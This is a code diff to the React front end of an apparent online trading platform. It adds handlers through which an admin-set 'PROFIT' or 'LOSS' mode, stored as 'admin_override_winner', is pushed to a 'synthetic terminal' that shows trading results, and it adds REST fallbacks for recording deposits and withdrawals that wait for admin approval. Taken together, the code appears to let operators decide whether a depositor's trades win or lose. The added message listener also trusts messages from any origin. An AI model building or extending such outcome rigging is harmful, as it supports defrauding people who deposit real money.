@@ -69,7 +69,7 @@ import {
 import './App.css'
 import './features/features.css'
 import { TIMEFRAME_TO_MS, getTimeframeVolatility } from './chartTimeframes'
-import { supabase, supabaseConfigured } from './lib/supabase'
+import { supabase, supabaseUrl, supabaseKey, supabaseConfigured } from './lib/supabase'
 import type { Session } from '@supabase/supabase-js'
 import AiScanner from './features/AiScanner'
 import type { AiSignal } from './features/AiScanner'
@@ -1232,6 +1232,42 @@ export default function App() {
     return () => window.removeEventListener('message', handleSyntheticMessage)
   }, [activeView, demoAccountName, liveAccountCreated, syncSyntheticTerminalAccount, theme])
 
+  useEffect(() => {
+    const handleAllocationMessage = (event: MessageEvent) => {
+      if (event.data && event.data.type === 'EXSTRADE_PROFIT_ALLOCATION') {
+        const mode = event.data.mode === 'LOSS' ? 'LOSS' : 'PROFIT'
+        setUserTradingMode(mode)
+        localStorage.setItem('admin_override_winner', mode === 'PROFIT' ? 'true' : 'false')
+        if (syntheticTerminalRef.current?.contentWindow) {
+          syntheticTerminalRef.current.contentWindow.postMessage({
+            type: 'EXSTRADE_PROFIT_ALLOCATION',
+            mode,
+          }, '*')
+        }
+      }
+    }
+
+    const handleStorageChange = (e: StorageEvent) => {
+      if (e.key === 'exstrade_profit_allocation_sync' || e.key === 'admin_override_winner') {
+        const mode = localStorage.getItem('admin_override_winner') === 'false' ? 'LOSS' : 'PROFIT'
+        setUserTradingMode(mode)
+        if (syntheticTerminalRef.current?.contentWindow) {
+          syntheticTerminalRef.current.contentWindow.postMessage({
+            type: 'EXSTRADE_PROFIT_ALLOCATION',
+            mode,
+          }, '*')
+        }
+      }
+    }
+
+    window.addEventListener('message', handleAllocationMessage)
+    window.addEventListener('storage', handleStorageChange)
+    return () => {
+      window.removeEventListener('message', handleAllocationMessage)
+      window.removeEventListener('storage', handleStorageChange)
+    }
+  }, [])
+
   // Toast Notification Helper
   const showNotice = (message: string) => {
     setNotice(message)
@@ -1603,12 +1639,16 @@ export default function App() {
         .eq('id', user.id)
         .maybeSingle()
 
-      if (mounted && profData && syntheticTerminalRef.current?.contentWindow) {
+      if (mounted && profData) {
         const mode = profData.trading_mode === 'LOSS' ? 'LOSS' : 'PROFIT'
-        syntheticTerminalRef.current.contentWindow.postMessage({
-          type: 'EXSTRADE_PROFIT_ALLOCATION',
-          mode,
-        }, '*')
+        setUserTradingMode(mode)
+        localStorage.setItem('admin_override_winner', mode === 'PROFIT' ? 'true' : 'false')
+        if (syntheticTerminalRef.current?.contentWindow) {
+          syntheticTerminalRef.current.contentWindow.postMessage({
+            type: 'EXSTRADE_PROFIT_ALLOCATION',
+            mode,
+          }, '*')
+        }
       }
     }
 
@@ -1630,12 +1670,16 @@ export default function App() {
           if (profile.kyc_status) {
             setUser(u => u ? { ...u, accountStatus: 'active' } : u)
           }
-          if (profile.trading_mode && syntheticTerminalRef.current?.contentWindow) {
+          if (profile.trading_mode) {
             const mode = profile.trading_mode === 'LOSS' ? 'LOSS' : 'PROFIT'
-            syntheticTerminalRef.current.contentWindow.postMessage({
-              type: 'EXSTRADE_PROFIT_ALLOCATION',
-              mode,
-            }, '*')
+            setUserTradingMode(mode)
+            localStorage.setItem('admin_override_winner', mode === 'PROFIT' ? 'true' : 'false')
+            if (syntheticTerminalRef.current?.contentWindow) {
+              syntheticTerminalRef.current.contentWindow.postMessage({
+                type: 'EXSTRADE_PROFIT_ALLOCATION',
+                mode,
+              }, '*')
+            }
           }
         }
       })
@@ -2071,39 +2115,76 @@ export default function App() {
 
     setLiveAccountCreated(true)
 
-    if (supabase && user) {
-      // Record PENDING deposit transaction in Supabase for Admin approval
-      const { data: transaction } = await supabase.from('transactions').insert({
-        user_id: user.id,
-        type: 'deposit',
-        amount: depositAmount,
-        total_amount: totalAdded,
-        asset: 'USD',
-        gateway_network: network,
-        reference_code: reference || '',
-        status: 'pending',
-      }).select('id, created_at').maybeSingle()
+    let transactionId: string | undefined
+    let createdAt: string | undefined
 
-      recordFundingHistory({
-        id: transaction?.id ? String(transaction.id) : undefined,
-        createdAt: transaction?.created_at ? String(transaction.created_at) : undefined,
-        type: 'deposit',
-        amount: depositAmount,
-        creditedAmount: totalAdded,
-        network,
-        reference,
-        status: 'pending',
-      })
-    } else {
-      recordFundingHistory({
-        type: 'deposit',
-        amount: depositAmount,
-        creditedAmount: totalAdded,
-        network,
-        reference,
-        status: 'pending',
-      })
+    if (user) {
+      if (supabase) {
+        try {
+          const { data: transaction } = await supabase.from('transactions').insert({
+            user_id: user.id,
+            type: 'deposit',
+            amount: depositAmount,
+            total_amount: totalAdded,
+            asset: 'USD',
+            gateway_network: network,
+            reference_code: reference || '',
+            status: 'pending',
+          }).select('id, created_at').maybeSingle()
+
+          if (transaction) {
+            transactionId = String(transaction.id)
+            createdAt = String(transaction.created_at)
+          }
+        } catch {
+          // silent
+        }
+      }
+
+      if (!transactionId && supabaseUrl && supabaseKey) {
+        try {
+          const restRes = await fetch(`${supabaseUrl}/rest/v1/transactions`, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+              'apikey': supabaseKey,
+              'Authorization': `Bearer ${supabaseKey}`,
+              'Prefer': 'return=representation',
+            },
+            body: JSON.stringify({
+              user_id: user.id,
+              type: 'deposit',
+              amount: depositAmount,
+              total_amount: totalAdded,
+              asset: 'USD',
+              gateway_network: network,
+              reference_code: reference || '',
+              status: 'pending',
+            }),
+          })
+          if (restRes.ok) {
+            const rows = await restRes.json()
+            if (Array.isArray(rows) && rows[0]) {
+              transactionId = String(rows[0].id)
+              createdAt = String(rows[0].created_at)
+            }
+          }
+        } catch {
+          // silent
+        }
+      }
     }
+
+    recordFundingHistory({
+      id: transactionId,
+      createdAt,
+      type: 'deposit',
+      amount: depositAmount,
+      creditedAmount: totalAdded,
+      network,
+      reference,
+      status: 'pending',
+    })
 
     setModal(null)
     showNotice(`⏳ Deposit Request Submitted! $${depositAmount.toFixed(2)} on ${network}${refNote}. Status: PENDING Admin Verification.`)
@@ -2116,43 +2197,81 @@ export default function App() {
 
     setLiveAccountCreated(true)
 
-    if (supabase && user) {
-      const { data: transaction } = await supabase.from('transactions').insert({
-        user_id: user.id,
-        type: 'deposit',
-        amount: depAmount,
-        total_amount: totalAdded,
-        asset: 'USD',
-        gateway_network: selectedNetwork,
-        reference_code: '',
-        status: 'pending',
-      }).select('id, created_at').maybeSingle()
+    let transactionId: string | undefined
+    let createdAt: string | undefined
 
-      recordFundingHistory({
-        id: transaction?.id ? String(transaction.id) : undefined,
-        createdAt: transaction?.created_at ? String(transaction.created_at) : undefined,
-        type: 'deposit',
-        amount: depAmount,
-        creditedAmount: totalAdded,
-        network: selectedNetwork,
-        status: 'pending',
-      })
-    } else {
-      recordFundingHistory({
-        type: 'deposit',
-        amount: depAmount,
-        creditedAmount: totalAdded,
-        network: selectedNetwork,
-        status: 'pending',
-      })
+    if (user) {
+      if (supabase) {
+        try {
+          const { data: transaction } = await supabase.from('transactions').insert({
+            user_id: user.id,
+            type: 'deposit',
+            amount: depAmount,
+            total_amount: totalAdded,
+            asset: 'USD',
+            gateway_network: selectedNetwork,
+            reference_code: '',
+            status: 'pending',
+          }).select('id, created_at').maybeSingle()
+
+          if (transaction) {
+            transactionId = String(transaction.id)
+            createdAt = String(transaction.created_at)
+          }
+        } catch {
+          // silent
+        }
+      }
+
+      if (!transactionId && supabaseUrl && supabaseKey) {
+        try {
+          const restRes = await fetch(`${supabaseUrl}/rest/v1/transactions`, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+              'apikey': supabaseKey,
+              'Authorization': `Bearer ${supabaseKey}`,
+              'Prefer': 'return=representation',
+            },
+            body: JSON.stringify({
+              user_id: user.id,
+              type: 'deposit',
+              amount: depAmount,
+              total_amount: totalAdded,
+              asset: 'USD',
+              gateway_network: selectedNetwork,
+              reference_code: '',
+              status: 'pending',
+            }),
+          })
+          if (restRes.ok) {
+            const rows = await restRes.json()
+            if (Array.isArray(rows) && rows[0]) {
+              transactionId = String(rows[0].id)
+              createdAt = String(rows[0].created_at)
+            }
+          }
+        } catch {
+          // silent
+        }
+      }
     }
+
+    recordFundingHistory({
+      id: transactionId,
+      createdAt,
+      type: 'deposit',
+      amount: depAmount,
+      creditedAmount: totalAdded,
+      network: selectedNetwork,
+      status: 'pending',
+    })
 
     setModal(null)
     showNotice(`⏳ Deposit Request Submitted! $${depAmount.toFixed(2)} on ${selectedNetwork}. Status: PENDING Admin Verification.`)
   }
 
   const handleFundsWithdrawalRequest = async (withdrawalAmount: number, network: string, destination: string) => {
-    // Immediately deduct the withdrawn amount from active balance
     if (accountType === 'demo') {
       const nextDemoBalance = Math.max(0, demoBalance - withdrawalAmount)
       setDemoBalance(nextDemoBalance)
@@ -2161,7 +2280,6 @@ export default function App() {
       setLiveBalance(nextLiveBalance)
 
       if (user) {
-        // Update user's wallet live_balance in Supabase
         await updateWalletBalanceInSupabase(user.id, nextLiveBalance)
       }
     }
@@ -2169,21 +2287,61 @@ export default function App() {
     let transactionId: string | undefined
     let createdAt: string | undefined
 
-    if (supabase && user) {
-      // 1. Record transaction in Supabase
-      const { data: transaction } = await supabase.from('transactions').insert({
-        user_id: user.id,
-        type: 'withdrawal',
-        amount: withdrawalAmount,
-        total_amount: withdrawalAmount,
-        asset: 'USD',
-        gateway_network: network,
-        reference_code: destination,
-        status: 'pending',
-      }).select('id, created_at').maybeSingle()
+    if (user) {
+      if (supabase) {
+        try {
+          const { data: transaction } = await supabase.from('transactions').insert({
+            user_id: user.id,
+            type: 'withdrawal',
+            amount: withdrawalAmount,
+            total_amount: withdrawalAmount,
+            asset: 'USD',
+            gateway_network: network,
+            reference_code: destination,
+            status: 'pending',
+          }).select('id, created_at').maybeSingle()
 
-      transactionId = transaction?.id ? String(transaction.id) : undefined
-      createdAt = transaction?.created_at ? String(transaction.created_at) : undefined
+          if (transaction) {
+            transactionId = String(transaction.id)
+            createdAt = String(transaction.created_at)
+          }
+        } catch {
+          // silent
+        }
+      }
+
+      if (!transactionId && supabaseUrl && supabaseKey) {
+        try {
+          const restRes = await fetch(`${supabaseUrl}/rest/v1/transactions`, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+              'apikey': supabaseKey,
+              'Authorization': `Bearer ${supabaseKey}`,
+              'Prefer': 'return=representation',
+            },
+            body: JSON.stringify({
+              user_id: user.id,
+              type: 'withdrawal',
+              amount: withdrawalAmount,
+              total_amount: withdrawalAmount,
+              asset: 'USD',
+              gateway_network: network,
+              reference_code: destination,
+              status: 'pending',
+            }),
+          })
+          if (restRes.ok) {
+            const rows = await restRes.json()
+            if (Array.isArray(rows) && rows[0]) {
+              transactionId = String(rows[0].id)
+              createdAt = String(rows[0].created_at)
+            }
+          }
+        } catch {
+          // silent
+        }
+      }
     }
 
     recordFundingHistory({
@@ -2219,20 +2377,61 @@ export default function App() {
     let transactionId: string | undefined
     let createdAt: string | undefined
 
-    if (supabase && user) {
-      const { data: transaction } = await supabase.from('transactions').insert({
-        user_id: user.id,
-        type: 'withdrawal',
-        amount: wAmount,
-        total_amount: wAmount,
-        asset: 'USD',
-        gateway_network: selectedNetwork,
-        reference_code: 'Modal Withdrawal',
-        status: 'pending',
-      }).select('id, created_at').maybeSingle()
+    if (user) {
+      if (supabase) {
+        try {
+          const { data: transaction } = await supabase.from('transactions').insert({
+            user_id: user.id,
+            type: 'withdrawal',
+            amount: wAmount,
+            total_amount: wAmount,
+            asset: 'USD',
+            gateway_network: selectedNetwork,
+            reference_code: 'Modal Withdrawal',
+            status: 'pending',
+          }).select('id, created_at').maybeSingle()
 
-      transactionId = transaction?.id ? String(transaction.id) : undefined
-      createdAt = transaction?.created_at ? String(transaction.created_at) : undefined
+          if (transaction) {
+            transactionId = String(transaction.id)
+            createdAt = String(transaction.created_at)
+          }
+        } catch {
+          // silent
+        }
+      }
+
+      if (!transactionId && supabaseUrl && supabaseKey) {
+        try {
+          const restRes = await fetch(`${supabaseUrl}/rest/v1/transactions`, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+              'apikey': supabaseKey,
+              'Authorization': `Bearer ${supabaseKey}`,
+              'Prefer': 'return=representation',
+            },
+            body: JSON.stringify({
+              user_id: user.id,
+              type: 'withdrawal',
+              amount: wAmount,
+              total_amount: wAmount,
+              asset: 'USD',
+              gateway_network: selectedNetwork,
+              reference_code: 'Modal Withdrawal',
+              status: 'pending',
+            }),
+          })
+          if (restRes.ok) {
+            const rows = await restRes.json()
+            if (Array.isArray(rows) && rows[0]) {
+              transactionId = String(rows[0].id)
+              createdAt = String(rows[0].created_at)
+            }
+          }
+        } catch {
+          // silent
+        }
+      }
     }
 
     recordFundingHistory({
